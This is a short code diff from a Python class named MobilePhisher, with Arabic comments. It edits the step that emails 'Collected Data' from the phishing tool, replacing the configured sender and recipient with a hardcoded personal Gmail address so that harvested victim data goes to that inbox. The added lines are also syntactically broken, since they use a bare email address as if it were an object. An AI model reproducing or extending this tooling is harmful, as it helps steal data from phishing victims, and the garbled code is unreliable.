@@ -180,8 +180,8 @@ class MobilePhisher:
         
         # إنشاء رسالة البريد الإلكتروني
         msg = MIMEMultipart()
-        msg['From'] = self.smtp_config['email']
-        msg['To'] = self.smtp_config['email']
+        msg['From'] = omarhegaz7@gmail.com['email']
+        msg['To'] = omarhegaz7@gmail.com['email']
         msg['Subject'] = f"Collected Data - {datetime.now()}"
         
         # نص الرسالة
